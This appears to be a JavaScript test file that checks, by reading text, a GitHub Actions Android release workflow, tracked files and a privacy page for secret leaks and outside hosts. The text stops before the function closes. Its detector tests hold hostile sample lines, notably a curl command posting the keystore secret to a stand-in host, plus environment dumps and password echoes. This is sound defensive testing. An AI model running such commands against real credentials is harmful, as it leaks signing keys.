'use strict';
// Getting the Android app onto Google Play, as far as it can be READ. Nothing here can run a GitHub workflow,
// Gradle, keytool or Play Console: a green run means "the files say what they should", nothing more.
//
//   A. the detectors below can fail (each is shown a line it must refuse)
//   B. .github/workflows/android-release.yml: manual only, main only, a read-only token, no credentials left in
//      the checkout; GitHub's own actions only (anything else pinned to a commit SHA); a secret reaches a step
//      through `env:` alone, is never echoed, and nothing turns on shell or Gradle tracing; exactly the four
//      PSYNC_… variables app/build.gradle reads; a missing secret FAILS the run before anything is built; the
//      keystore is decoded after `npm ci`, into the runner's temp folder, never uploaded, shredded whatever
//      happened; an unsigned bundle fails the run before the upload; nothing talks to Google Play
//   C. no signing material and no service-account key is tracked
//   D. privacy.html: a page of text — no analytics by name or by script, no host it could talk to, nothing
//      linked outside the site, no service worker, not part of the app shell; ONE owner placeholder (or, once
//      the owner has filled it in, one e-mail address, there and nowhere else); the affiliation disclaimer word
//      for word; login.html's first-paint theme script and token values; the mark's one geometry. And what the
//      page PROMISES, held to the code: the sign-in goes "to Psycle and nowhere else" (the app shells' connect-src,
//      the hosts js/ names), what the native apps are built with (ios-app/package.json), the calendar read, the
//      notifications a phone with no notification permission shows, the stores' own diagnostics
//   E. ios-app/PLAY_STORE_DEPLOY.md names the workflow, the four secrets, the four Gradle variables and the
//      privacy page, has its ten steps, tells the owner to check Google's figures, and quotes the target API
//      level variables.gradle really has; ANDROID.md and PLAY_STORE_LISTING.md point at it
//   F. the listing graphics: the two PNGs are the sizes Play asks for, without an alpha channel; the feature
//      graphic's SVG is the icon's mark plus an OUTLINED wordmark (no font, no text element); the render script;
//      tests/tools/appstore-shots.mjs --play draws 1080 x 1920 into a folder of its own and leaves the App
//      Store canvas as it was
module.exports = function (t) {
  const { ok, eq, fs, path, REPO_ROOT } = t;
  const abs = (rel) => path.join(REPO_ROOT, rel);
  const has = (rel) => fs.existsSync(abs(rel));
  const read = (rel) => (has(rel) ? t.readSource(rel) : '');

  const WORKFLOW = '.github/workflows/android-release.yml';
  const GUIDE = 'ios-app/PLAY_STORE_DEPLOY.md';
  const SECRETS = ['PSYNC_KEYSTORE_BASE64', 'PSYNC_KEYSTORE_PASSWORD', 'PSYNC_KEY_ALIAS', 'PSYNC_KEY_PASSWORD'];
  // What must never be printed: the two passwords and the keystore's bytes. (The alias is a secret too, but it
  // is a name, and keytool needs it as an argument.)
  const NEVER_PRINTED = ['PSYNC_KEYSTORE_BASE64', 'PSYNC_KEYSTORE_PASSWORD', 'PSYNC_KEY_PASSWORD'];

  // ── Readers ────────────────────────────────────────────────────────────────────────────────────
  // The workflow is read as text (no YAML parser here, by design): comments off, then step by step.
  const uncomment = (yaml) => yaml.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  const stepsOf = (yaml) => {
    const at = yaml.indexOf('\n    steps:\n');
    if (at === -1) return [];
    return yaml.slice(at + '\n    steps:\n'.length).split(/\n(?= {6}- )/).map((text) => {
      const name = (/^ {6}- name: (.*)$/m.exec(text) || [])[1] || '';
      const runAt = text.search(/\n {8}run: /);
      const run = runAt === -1 ? '' : text.slice(runAt).replace(/^\n {8}run: \|?\n?/, '');
      const head = runAt === -1 ? text : text.slice(0, runAt);
      const envAt = head.search(/\n {8}env:\n/);
      const env = envAt === -1 ? {} : head.slice(envAt).split('\n').slice(2).reduce((out, l) => {
        const m = /^ {10}([A-Z_][A-Z0-9_]*): (.*)$/.exec(l); if (m) out[m[1]] = m[2]; return out;
      }, {});
      return { name, text, head, run, env, uses: (/\n {8}uses: (\S+)/.exec(text) || [])[1] || '', cond: (/\n {8}if: (.*)/.exec(text) || [])[1] || '' };
    });
  };
  // A line of a run script that could put a secret's VALUE into the log: it mentions the variable with a $
  // and is not one of the three shapes that only TEST it or PIPE it into base64.
  const printsSecret = (line) => NEVER_PRINTED.some((n) => new RegExp('\\$\\{?' + n + '\\b').test(line)) &&
    !/^\s*\[ -n "\$(PSYNC_[A-Z0-9_]+)" \] \|\| missing="\$missing \1"\s*$/.test(line) &&
    !/^\s*printf '%s' "\$PSYNC_KEYSTORE_BASE64" \| base64 --decode\b[^|;&]*> "\$PSYNC_KEYSTORE_FILE"\s*$/.test(line);
  const TRACING = /(?:^|[\s;&|])set\s+-[a-wyz]*x|set\s+-o\s+xtrace|\bxtrace\b|(?:^|\s)--(?:debug|info|scan)\b|\bprintenv\b|(?:^|[\s;&|])env\s*(?:$|[|>])|\bexport\s+-p\b|ACTIONS_STEP_DEBUG|ACTIONS_RUNNER_DEBUG/;
  const pinnedOrFirstParty = (uses) => /^actions\/[a-z0-9-]+@v\d+(?:\.\d+){0,2}$/.test(uses) || /^[\w.-]+\/[\w./-]+@[0-9a-f]{40}$/.test(uses);
  const SIGNING_FILE = /(?:\.jks|\.keystore|\.p12|\.pfx)$|(?:^|\/)keystore\.properties$/i;
  const SERVICE_ACCOUNT_NAME = /(?:^|\/)[^/]*(?:service[-_.]?account|play[-_.]?(?:store[-_.]?)?(?:key|credentials|publisher)|google[-_.]?play[-_.]?(?:key|api))[^/]*\.json$/i;
  const SERVICE_ACCOUNT_BODY = /"type"\s*:\s*"service_account"|-----BEGIN (?:RSA |EC |ENCRYPTED |OPENSSH )?PRIVATE KEY-----/;
  const EMAIL = /[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/g;
  const ANALYTICS = /google-?analytics|googletagmanager|gtag\s*\(|\bga\s*\(\s*['"]|firebase|crashlytics|sentry|mixpanel|segment\.(?:com|io)|amplitude|hotjar|plausible|matomo|posthog|datadog|newrelic|bugsnag|appcenter|facebook\.net|doubleclick|adsbygoogle|admob/i;
  const pngHeader = (rel) => { const b = fs.readFileSync(abs(rel)); return { png: b.slice(1, 4).toString('latin1') === 'PNG', w: b.readUInt32BE(16), h: b.readUInt32BE(20), depth: b[24], colour: b[25], bytes: b.length }; };

  // ── A. The detectors can fail ──────────────────────────────────────────────────────────────────
  t.section('Play release: the detectors refuse what they should');
  ok(printsSecret('echo "$PSYNC_KEY_PASSWORD"') && printsSecret('  echo ${PSYNC_KEYSTORE_PASSWORD} | md5sum') && printsSecret('printf \'%s\' "$PSYNC_KEYSTORE_BASE64" | base64 --decode | tee /tmp/x > "$PSYNC_KEYSTORE_FILE"') &&
    printsSecret('curl -d "$PSYNC_KEYSTORE_BASE64" https://example.invalid'), 'an echo, a pipe into anything but the keystore file, or a request carrying a secret is refused');
  ok(!printsSecret('[ -n "$PSYNC_KEY_PASSWORD" ] || missing="$missing PSYNC_KEY_PASSWORD"') && !printsSecret('[ -n "$PSYNC_KEYSTORE_BASE64" ] || missing="$missing PSYNC_KEYSTORE_BASE64"') && !printsSecret('printf \'%s\' "$PSYNC_KEYSTORE_BASE64" | base64 --decode --ignore-garbage > "$PSYNC_KEYSTORE_FILE"') &&
    !printsSecret('keytool -list -keystore "$PSYNC_KEYSTORE_FILE" -storepass:env PSYNC_KEYSTORE_PASSWORD -alias "$PSYNC_KEY_ALIAS"'), 'a test for emptiness, the decode into the keystore file and keytool reading the password by NAME are not');
  ok(['set -x', 'set -ex', 'set -o xtrace', './gradlew bundleRelease --debug', './gradlew bundleRelease --info', 'printenv', 'env | sort', 'env', 'export -p'].every((l) => TRACING.test(l)) &&
    !['set -e', 'umask 077', './gradlew bundleRelease --no-daemon', 'environment: play-release', 'echo "All four signing secrets are set."'].some((l) => TRACING.test(l)), 'shell tracing, Gradle --info / --debug and a dump of the environment are refused; `set -e` and `--no-daemon` are not');
  ok(pinnedOrFirstParty('actions/checkout@v4') && pinnedOrFirstParty('reactivecircus/android-emulator-runner@a421e43855164a8197daf9d8d40fe71c6996bb0d') &&
    !pinnedOrFirstParty('r0adkll/upload-google-play@v1') && !pinnedOrFirstParty('someone/thing@main') && !pinnedOrFirstParty('actions/checkout@main'), 'a third-party action on a tag or a branch is refused; a commit SHA, or actions/*@vN, is not');
  ok(SIGNING_FILE.test('psync-upload.jks') && SIGNING_FILE.test('a/b/upload.KEYSTORE') && SIGNING_FILE.test('ios-app/android/keystore.properties') && SIGNING_FILE.test('x/upload.p12') && !SIGNING_FILE.test('docs/keystore.md') &&
    SERVICE_ACCOUNT_NAME.test('ios-app/play-service-account.json') && SERVICE_ACCOUNT_NAME.test('service_account.json') && SERVICE_ACCOUNT_NAME.test('secrets/google-play-key.json') && !SERVICE_ACCOUNT_NAME.test('ios-app/package.json') && !SERVICE_ACCOUNT_NAME.test('manifest.json') &&
    SERVICE_ACCOUNT_BODY.test('{ "type": "service_account", "project_id": "x" }') && SERVICE_ACCOUNT_BODY.test('-----BEGIN PRIVATE KEY-----') && !SERVICE_ACCOUNT_BODY.test('{ "type": "module" }'), 'the patterns for signing material and for a service-account key match what they should');
  ok(ANALYTICS.test('www.googletagmanager.com/gtag/js') && ANALYTICS.test('Sentry.init({})') && !ANALYTICS.test('No analytics, no advertising, no tracking'), 'an analytics product is recognised by name; the sentence that says there is none is not one');

  // ── B. The release workflow ────────────────────────────────────────────────────────────────────
  t.section('Play release: the workflow is manual, main-only, read-only, and cannot leak or skip the signing key');
  ok(has(WORKFLOW), WORKFLOW + ' exists');
  const raw = read(WORKFLOW);
  const wf = uncomment(raw);
  const steps = stepsOf(wf);
  const byName = (re) => steps.filter((s) => re.test(s.name))[0] || { name: '', text: '', head: '', run: '', env: {}, uses: '', cond: '' };
  const indexOf = (re) => steps.findIndex((s) => re.test(s.name));
  ok(steps.length >= 10 && steps.every((s) => s.name), 'its steps can be read, and every one has a name (' + steps.length + ')');

  // Triggers: workflow_dispatch and nothing else, with the version name as an input.
  const onBlock = (/\non:\n([\s\S]*?)\n(?=[A-Za-z])/.exec(wf) || [])[1] || '';
  eq((onBlock.match(/^ {2}[a-z_]+:/gm) || []).map((k) => k.trim()), ['workflow_dispatch:'], 'the ONLY trigger is workflow_dispatch: no push, no pull_request, no schedule, no workflow_call');
  ok(/^ {6}version_name:\n(?: {8}.*\n)*? {8}required: true\n/m.test(onBlock) && /^ {8}type: string$/m.test(onBlock), '…with a required input for the version name');
  ok(!/\bpull_request_target\b|\bworkflow_run\b|\brepository_dispatch\b/.test(wf), 'no trigger that runs with secrets on someone else\'s say-so');

  // Token and checkout.
  eq((wf.match(/^\s*permissions:.*$/gm) || []).length, 1, 'permissions are declared once, for the whole workflow');
  ok(/\npermissions:\n {2}contents: read\n(?! {2}\S)/.test(wf) && !/:\s*write\b/.test(wf), '…as `contents: read` and nothing else; nothing anywhere asks for write');
  const checkout = byName(/^Checkout$/);
  ok(/^actions\/checkout@v\d+$/.test(checkout.uses) && /\n {10}persist-credentials: false\b/.test(checkout.text), 'the checkout leaves no credentials behind (persist-credentials: false)');
  ok(!/\n {10}ref:/.test(checkout.text), '…and checks out the ref the run was started from (no `ref:` to point it elsewhere)');

  // main only — said out loud, first.
  const guard = steps[0] || {};
  ok(/main/i.test(guard.name) && guard.cond === "github.ref != 'refs/heads/main'" && /\bexit 1\b/.test(guard.run) && /::error /.test(guard.run),
    'the FIRST step fails, with a plain ::error, on any ref but refs/heads/main (a job-level `if:` would skip in silence)');
  eq(steps.filter((s) => /continue-on-error/.test(s.text)).map((s) => s.name), [], 'no step is allowed to fail quietly (no continue-on-error)');
  ok(!/\n {4}continue-on-error:/.test(wf), '…and neither is the job');

  // Actions.
  const uses = steps.map((s) => s.uses).filter(Boolean);
  eq(uses.filter((u) => !pinnedOrFirstParty(u)), [], 'every action is GitHub\'s own (actions/*@vN) or pinned to a full commit SHA');
  eq(uses.filter((u) => !/^actions\//.test(u)), [], '…and today there is none but GitHub\'s own');
  ok(/uses: actions\/setup-java@v\d+[\s\S]*?distribution: temurin[\s\S]*?java-version: 17\b/.test(wf) && /uses: actions\/setup-node@v\d+[\s\S]*?node-version: 20\b/.test(wf), 'JDK 17 (temurin) and Node 20, as the debug build uses');
  ok(!/\n\s+cache:/.test(wf) && !/actions\/cache@/.test(wf), 'a release build restores no dependency cache');

  // Secrets: the four, through env: only.
  const named = Array.from(new Set((wf.match(/\bsecrets\.([A-Za-z_][A-Za-z0-9_]*)/g) || []).map((s) => s.slice('secrets.'.length)))).sort();
  eq(named, SECRETS.slice().sort(), 'it reads exactly four secrets: ' + SECRETS.join(', '));
  eq(wf.split('\n').filter((l) => /\bsecrets\./.test(l) && !/^ {10}[A-Z_][A-Z0-9_]*: \$\{\{ secrets\.[A-Z_][A-Z0-9_]* \}\}$/.test(l)), [], 'a secret appears ONLY as the whole value of a step-level env: entry');
  eq(steps.filter((s) => /\$\{\{/.test(s.run)).map((s) => s.name), [], 'no run: script interpolates a ${{ }} expression (an input or a secret reaches a script as an environment variable)');
  ok(!/\n {4}env:\n/.test(wf) && !/^env:/m.test(wf), 'no job-level or workflow-level env: a secret is in the environment of the steps that name it, and no other');
  const allRun = steps.map((s) => s.run).join('\n').split('\n');
  eq(allRun.filter(printsSecret).map((l) => l.trim()), [], 'no line of any script can print a password or the keystore\'s bytes');
  eq(allRun.filter((l) => TRACING.test(l)).map((l) => l.trim()), [], 'no `set -x`, no Gradle --info / --debug, no dump of the environment');
  ok(!/\bGITHUB_ENV\b/.test(steps.map((s) => s.run).join('\n')), 'nothing is written to $GITHUB_ENV (it would hand a value to every later step)');
  const holders = steps.filter((s) => Object.keys(s.env).some((k) => NEVER_PRINTED.indexOf(k) !== -1)).map((s) => s.name);
  const installers = steps.filter((s) => /\bnpm (?:ci|install|run)\b/.test(s.run));
  ok(installers.length >= 2 && installers.every((s) => Object.keys(s.env).length === 0), '`npm ci` and `npm run sync:android` run with NO secret in their environment (install scripts never see one)');
  ok(holders.length >= 3 && holders.length <= 4, 'the passwords are handed to the few steps that need them (' + holders.join(' · ') + ')');

  // The four names Gradle reads.
  const gradle = read('ios-app/android/app/build.gradle');
  const gradleVars = (((/def psyncSigningEnv = \[([\s\S]*?)\n\]/.exec(gradle) || [])[1] || '').match(/'(PSYNC_[A-Z_]+)'/g) || []).map((s) => s.slice(1, -1)).sort();
  eq(gradleVars, ['PSYNC_KEYSTORE_FILE', 'PSYNC_KEYSTORE_PASSWORD', 'PSYNC_KEY_ALIAS', 'PSYNC_KEY_PASSWORD'].sort(), 'app/build.gradle reads four environment variables');
  ok(gradleVars.every((v) => new RegExp('System\\.getenv\\(variable\\)').test(gradle)) && /if \(psyncCanSign\)/.test(gradle), '…through System.getenv, and signs a release only when all four are there');
  const build = byName(/^Build the signed bundle$/);
  eq(Object.keys(build.env).sort(), gradleVars, 'the Gradle step is given EXACTLY those four — no more, no fewer');
  ok(/^\.\/gradlew bundleRelease\b/.test(build.run.trim()) && /\n {8}working-directory: ios-app\/android\n/.test(build.text), '…and runs `./gradlew bundleRelease` in ios-app/android');
  ok(/^\$\{\{ runner\.temp \}\}\/[\w.-]+$/.test(build.env.PSYNC_KEYSTORE_FILE || ''), 'PSYNC_KEYSTORE_FILE is a file in the runner\'s TEMP folder — never the workspace');
  eq(steps.filter((s) => s.env.PSYNC_KEYSTORE_FILE).map((s) => s.env.PSYNC_KEYSTORE_FILE).filter((v) => v !== build.env.PSYNC_KEYSTORE_FILE), [], '…the same path in every step that names it');

  // A missing secret fails the run, first.
  const check = byName(/secrets exist/i);
  eq(Object.keys(check.env).sort(), SECRETS.slice().sort(), 'one step is handed all four secrets to check them');
  eq(SECRETS.filter((n) => check.run.indexOf('[ -n "$' + n + '" ] || missing="$missing ' + n + '"') === -1), [], '…tests each for emptiness, by name');
  ok(/if \[ -n "\$missing" \]; then\n[\s\S]*?::error [\s\S]*?\n\s+exit 1\n\s+fi/.test(check.run), '…and FAILS with a plain ::error naming what is missing — an unsigned bundle is never mistaken for a release');
  ok(indexOf(/secrets exist/i) === 1 && indexOf(/secrets exist/i) < indexOf(/^Checkout$/), '…before anything is checked out, installed or built');

  // The keystore's life.
  const decode = byName(/^Decode the upload keystore/);
  ok(/umask 077/.test(decode.run) && /base64 --decode/.test(decode.run) && /\[ ! -s "\$PSYNC_KEYSTORE_FILE" \]/.test(decode.run) && /\bexit 1\b/.test(decode.run), 'the keystore is decoded under umask 077, and an empty result fails the run');
  ok(/keytool -list [^\n]*-storepass:env PSYNC_KEYSTORE_PASSWORD[^\n]*> \/dev\/null 2>&1/.test(decode.run), '…then opened once with keytool — the password read from the environment BY NAME, keytool\'s own output dropped');
  ok(indexOf(/^Decode the upload keystore/) > Math.max.apply(null, steps.map((s, i) => (/\bnpm (?:ci|install|run)\b/.test(s.run) ? i : -1))), '…AFTER `npm ci` and the sync: no install script runs while the keystore is on disk');
  ok(indexOf(/^Decode the upload keystore/) < indexOf(/^Build the signed bundle$/), '…and before Gradle');
  const shred = steps[steps.length - 1] || {};
  const shreds = (st) => /shred -u "\$PSYNC_KEYSTORE_FILE"/.test(st.run) && /rm -f "\$PSYNC_KEYSTORE_FILE"/.test(st.run) && /\[ ! -e "\$PSYNC_KEYSTORE_FILE" \]/.test(st.run);
  ok(/shred|keystore/i.test(shred.name) && shred.cond === 'always()' && shreds(shred),
    'the LAST step shreds the keystore whatever happened (if: always()), and fails if the file is still there');
  // …and it is gone as soon as nothing needs it: the upload action is not this repository's code, and runs on the
  // same machine. Every step from the first shred on is held to know nothing of the key.
  const firstShred = steps.findIndex(shreds);
  const usesAfterDecode = steps.map((st, i) => (st.uses && i > indexOf(/^Decode the upload keystore/) ? i : -1)).filter((i) => i !== -1);
  ok(firstShred !== -1 && firstShred === indexOf(/^Verify the bundle is signed/) + 1 && steps[firstShred].cond === '' && firstShred < steps.length - 1,
    'the keystore is ALSO shredded straight after the bundle is verified — unconditionally, as a step of its own, and not only by the always() step at the end');
  ok(usesAfterDecode.length >= 1 && usesAfterDecode.every((i) => i > firstShred), '…so NO action (`uses:`) runs while the keystore is on disk: between the decode and that shred every step is a script of this file (the upload comes after it)');
  eq(steps.slice(firstShred === -1 ? 0 : firstShred).filter((st) => Object.keys(st.env).some((k) => /PASSWORD|BASE64|ALIAS/.test(k))).map((st) => st.name), [], '…and from that shred on, no step is handed a password, the alias or the keystore\'s bytes');

  // Signed, or no artifact.
  const verify = byName(/^Verify the bundle is signed/);
  ok(/jarsigner -verify "\$aab"[^\n]*\| grep -q 'jar verified'/.test(verify.run) && /^\s*if ! jarsigner/m.test(verify.run), 'the bundle is verified by jarsigner\'s WORDS ("jar verified"): its exit code is 0 for an unsigned jar too');
  ok(/keytool -printcert -jarfile "\$aab"/.test(verify.run) && /\[ -z "\$want" \] \|\| \[ "\$want" != "\$got" \]/.test(verify.run), '…and its certificate is held to the upload keystore\'s own');
  ok((verify.run.match(/\bexit 1\b/g) || []).length >= 3, '…each failure ends the run');
  const upload = byName(/^Upload the bundle$/);
  ok(indexOf(/^Build the signed bundle$/) < indexOf(/^Verify the bundle is signed/) && indexOf(/^Verify the bundle is signed/) < indexOf(/^Upload the bundle$/) && upload.cond === '', 'the upload comes after the verification and only on success: a red run leaves no bundle behind');
  const uploads = steps.filter((s) => /upload-artifact/.test(s.uses));
  eq(uploads.map((s) => (/\n {10}path: (.*)/.exec(s.text) || [])[1]), ['ios-app/android/app/build/outputs/bundle/release/app-release.aab'], 'ONE artifact, ONE file by its full path: the .aab (no folder, no glob that could sweep up anything else)');
  ok(!/runner\.temp|RUNNER_TEMP|keystore|\.jks/i.test(upload.text), '…and the upload step knows nothing of the keystore or the temp folder');
  const days = Number((/\n {10}retention-days: (\d+)/.exec(upload.text) || [])[1]);
  ok(days >= 1 && days <= 7 && /\n {10}if-no-files-found: error\b/.test(upload.text), 'kept for a few days only (' + days + '), and a missing file is an error');

  // It builds; it does not publish.
  ok(!/androidpublisher|upload-google-play|fastlane|\bsupply\b|service[-_ ]?account|GOOGLE_APPLICATION_CREDENTIALS|play\.google\.com|googleapis/i.test(wf), 'nothing in it talks to Google Play: the upload is the owner\'s, by hand');
  ok(/\n {4}runs-on: ubuntu-latest\n/.test(wf) && /\n {4}timeout-minutes: \d+\n/.test(wf) && /\nconcurrency:\n {2}group: [\w-]+\n {2}cancel-in-progress: false\n/.test(wf), 'one job on ubuntu-latest, with a timeout, one run at a time');
  const version = byName(/^Read the version/);
  ok(/versionName/.test(version.run) && /versionCode/.test(version.run) && /\[ "\$name" != "\$WANTED_VERSION_NAME" \]/.test(version.run) && version.env.WANTED_VERSION_NAME === '${{ inputs.version_name }}' && !/\bsed -i\b|>\s*"?\$gradle/.test(version.run),
    'the version-name input is a CONFIRMATION held against app/build.gradle; nothing is edited on the runner');
  const firstEcho = version.run.search(/echo [^\n]*\$WANTED_VERSION_NAME/);
  ok(/plain\(\) \{ case "\$1" in ''\|\*\[!0-9A-Za-z\._\+-\]\*\) return 1 ;; esac; \[ "\$\{#1\}" -le 30 \]; \}/.test(version.run) && version.run.indexOf('if ! plain "$WANTED_VERSION_NAME"; then') !== -1 &&
    version.run.indexOf('if ! plain "$WANTED_VERSION_NAME"; then') < firstEcho && /if ! plain "\$name" \|\|/.test(version.run),
    '…what was typed is held to letters, digits and . _ + - (30 at most) BEFORE it is ever echoed, and so is the name read from the file, which names the artifact');
  // The same sed, run here on the real file: the step can read what build.gradle holds today.
  const vName = (/^[ \t]*versionName[ \t]*"([^"]*)"/m.exec(gradle) || [])[1];
  const vCode = (/^[ \t]*versionCode[ \t]*(\d+)/m.exec(gradle) || [])[1];
  ok(/^[0-9A-Za-z][0-9A-Za-z._+-]{0,29}$/.test(vName || '') && /^\d+$/.test(vCode || ''), 'app/build.gradle\'s versionName ("' + vName + '") and versionCode (' + vCode + ') are in the shape that step accepts');

  // ci.yml is untouched by all this: the debug build still needs no secret.
  ok(!/\bsecrets\./.test(uncomment(read('.github/workflows/ci.yml'))), 'ci.yml still reads no secret at all');

  // ── C. Nothing secret is tracked ───────────────────────────────────────────────────────────────
  t.section('Play release: no keystore and no service-account key is tracked');
  let tracked = null;
  try {
    tracked = require('child_process').execFileSync('git', ['ls-files', '-z'], { cwd: REPO_ROOT, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], maxBuffer: 64 * 1024 * 1024 }).split('\0').filter(Boolean);
  } catch (e) { tracked = null; }
  if (tracked) {
    ok(tracked.length > 100, 'git lists the tracked files (' + tracked.length + ')');
    eq(tracked.filter((f) => SIGNING_FILE.test(f)), [], 'no keystore (*.jks, *.keystore, *.p12, *.pfx) and no keystore.properties');
    eq(tracked.filter((f) => SERVICE_ACCOUNT_NAME.test(f)), [], 'no file named like a Google service-account or Play API key');
    const keyLike = tracked.filter((f) => /\.(?:json|pem|key|p8|env|properties)$/i.test(f) || /(?:^|\/)\.env(?:\.|$)/.test(f)).filter((f) => has(f) && fs.statSync(abs(f)).size < 8 * 1024 * 1024);
    eq(keyLike.filter((f) => SERVICE_ACCOUNT_BODY.test(fs.readFileSync(abs(f), 'utf8'))), [], 'and no tracked .json / .pem / .key / .env / .properties file holds a service-account body or a private key (' + keyLike.length + ' read)');
  } else {
    console.log('  · not a git checkout (or no git): the tracked-files check is skipped here; CI runs it');
  }

  // ── D. privacy.html ────────────────────────────────────────────────────────────────────────────
  t.section('Play release: privacy.html is a page of text — no analytics, nothing external, one owner placeholder, not in the app shell');
  ok(has('privacy.html'), 'privacy.html exists at the repository root (the hosted web app serves it)');
  const page = read('privacy.html');
  const pageNoComments = page.replace(/<!--[\s\S]*?-->/g, '');
  const visible = pageNoComments.replace(/<script[\s\S]*?<\/script>/g, ' ').replace(/<style[\s\S]*?<\/style>/g, ' ').replace(/<[^>]+>/g, ' ').replace(/&[a-z]+;|&#\d+;/g, ' ').replace(/\s+/g, ' ');
  ok(/<html lang="en-GB"/.test(page) && /<title>Privacy policy[^<]*Psync<\/title>/.test(page) && /<meta name="viewport"/.test(page), 'it is a titled page in English with a viewport');

  // No analytics, no script but the theme boot, no way to talk to a host.
  ok(!ANALYTICS.test(pageNoComments), 'it names no analytics, crash-reporting or advertising product');
  const scripts = pageNoComments.match(/<script\b[^>]*>/g) || [];
  eq(scripts, ['<script id="themeBoot">'], 'its ONE script is the inline first-paint theme script (no src=)');
  ok(!/\bfetch\s*\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|navigator\.serviceWorker|serviceWorker\.register|<iframe|<form|<object|<embed|document\.cookie/i.test(pageNoComments), 'no request, no beacon, no frame, no form, no cookie — and it registers NO service worker');
  const csp = (/<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(page) || [])[1] || '';
  ok(/(?:^|;\s*)default-src 'none'/.test(csp) && !/connect-src/.test(csp) && !/https?:|\*/.test(csp), 'its content security policy starts from default-src \'none\', grants no connect-src, and names no outside host');
  ok(/script-src 'unsafe-inline'/.test(csp) && /style-src 'unsafe-inline'/.test(csp) && /font-src 'self'/.test(csp) && /base-uri 'none'/.test(csp) && /form-action 'none'/.test(csp), '…inline script and style (the page is self-contained, as login.html is), fonts from this origin, no base, no form');

  // Nothing linked outside the site.
  const refs = (pageNoComments.match(/\b(?:href|src|action|srcset|poster|data)\s*=\s*"[^"]*"/g) || []).map((a) => a.replace(/^[^"]*"/, '').slice(0, -1));
  ok(refs.length >= 2, 'its links and sources can be read (' + refs.length + ')');
  eq(refs.filter((r) => /^[a-z][a-z0-9+.-]*:|^\/\//i.test(r)), [], 'every href / src is RELATIVE: nothing is linked or loaded from outside the site');
  eq((pageNoComments.match(/url\(\s*['"]?([^'")]+)/g) || []).map((u) => u.replace(/^url\(\s*['"]?/, '')).filter((u) => !/^fonts\/[\w-]+\.woff2$/.test(u) && !/^#[\w-]+$/.test(u)), [], '…and the only url() in it are the two font files in fonts/ and the mark\'s own #mask');
  eq(refs.filter((r) => !/^[a-z][a-z0-9+.-]*:|^\/\//i.test(r)).map((r) => r.replace(/^\.\//, '').replace(/[?#].*$/, '')).filter((r) => !has(r)), [], '…and every relative one resolves');
  ok(!/https?:\/\//i.test(pageNoComments), 'no http(s) address is written into it at all, even as text (Psycle\'s host is named without a scheme)');

  // The support page both store listings give as their Support URL: the same kind of page — text, relative links,
  // nothing loaded from outside, no service worker, not part of the app shell — naming the publisher and ONE address.
  {
    const sup = read('support.html');
    const supNoComments = sup.replace(/<!--[\s\S]*?-->/g, '');
    const supVisible = supNoComments.replace(/<script[\s\S]*?<\/script>/g, ' ').replace(/<style[\s\S]*?<\/style>/g, ' ').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ');
    const supRefs = (supNoComments.match(/\b(?:href|src|action|srcset|poster|data)\s*=\s*"[^"]*"/g) || []).map((a) => a.replace(/^[^"]*"/, '').slice(0, -1));
    ok(/<html lang="en-GB"/.test(sup) && /<title>Support[^<]*Psync<\/title>/.test(sup), 'support.html is a titled page in British English');
    eq(supRefs.filter((r) => /^[a-z][a-z0-9+.-]*:|^\/\//i.test(r)), [], '…every href / src on it is relative');
    ok(!/https?:\/\//i.test(supNoComments) && !/serviceWorker/.test(sup), '…no http(s) address is written into it, and it registers no service worker');
    eq(Array.from(new Set(supVisible.match(EMAIL) || [])), ['support@ajar.dev'], '…it gives ONE address to write to');
    ok(/Ajar\.dev Ltd/.test(supVisible) && /14071311/.test(supVisible) && /not affiliated with, or endorsed by, Psycle/.test(supVisible), '…names the publisher as privacy.html does, and says what Psync is not');
    ok(/href="\.\/privacy\.html"/.test(sup) && /href="\.\/support\.html"/.test(read('privacy.html')), '…and the two pages link to each other');
    ok(read('ios-app/build.js').indexOf("'support.html'") === -1 && read('sw.js').indexOf('support.html') === -1, '…like privacy.html it is not copied into the native bundle and not precached');
    ok(/support\.html/.test(read('ios-app/APP_STORE_LISTING.md')) && /support@ajar\.dev/.test(read('ios-app/PLAY_STORE_LISTING.md')), '…the App Store listing gives it as the Support URL, and the Play listing gives the same address as the developer contact');
  }

  // The ONE owner placeholder — or, once filled in, one e-mail address, there and nowhere else.
  const publisher = (/<span\b[^>]*\bid="publisher"[^>]*>([\s\S]*?)<\/span>/.exec(page) || [])[1];
  ok(typeof publisher === 'string' && (page.match(/\bid="publisher"/g) || []).length === 1, 'ONE element names the publisher (<span id="publisher">)');
  const PLACEHOLDER = /\[OWNER TO COMPLETE:[^\]]*\]/g;
  const placeholders = pageNoComments.match(PLACEHOLDER) || [];
  const emails = visible.match(EMAIL) || [];
  if (placeholders.length) {
    eq(placeholders.length, 1, 'it still carries the owner placeholder — exactly ONE');
    ok(PLACEHOLDER.test(publisher || '') && /name/i.test(publisher || '') && /e-mail/i.test(publisher || ''), '…inside that element, asking for a name and a contact e-mail address');
    eq(emails, [], '…and until the owner fills it in, the page invents nobody: no e-mail address anywhere on it');
    console.log('  · privacy.html still carries the owner placeholder: the owner fills it in before the page\'s address is given to a store (' + GUIDE + ', step 5.3)');
  } else {
    eq(emails.length, 1, 'the owner has filled the placeholder in: ONE e-mail address on the page');
    ok((String(publisher).replace(/<[^>]+>/g, ' ').match(EMAIL) || []).length === 1, '…and it is in the publisher element');
  }
  ok(!/\[(?:YOUR|TODO|TBD|DATE|EMAIL|NAME)[^\]]*\]|lorem ipsum|example\.com/i.test(visible), 'no other blank is left in it (no [YOUR …], [DATE], example.com)');

  // What it says.
  ok(visible.indexOf('Psync is an independent companion for Psycle London members. It is not affiliated with, or endorsed by, Psycle.') !== -1, 'it carries the affiliation disclaimer word for word (PLAY_STORE_LISTING.md → "The affiliation disclaimer")');
  ok(read('ios-app/PLAY_STORE_LISTING.md').indexOf('> Psync is an independent companion for Psycle London members. It is not affiliated with, or endorsed by, Psycle.') !== -1, '…the same sentence the listing file holds');
  ok(/iPhone/.test(visible) && /Android/.test(visible) && /web app/.test(visible), 'it covers the iPhone app, the Android app and the web app');
  ok(/psycle\.codexfit\.com/.test(visible) && /password is never stored/i.test(visible) && /nowhere else/i.test(visible), 'it says where the sign-in goes (Psycle\'s host, nowhere else) and that the password is never stored');
  ok(/No analytics/i.test(visible) && /no advertising/i.test(visible) && /no server of its own/i.test(visible), 'it says there are no analytics, no advertising and no server');
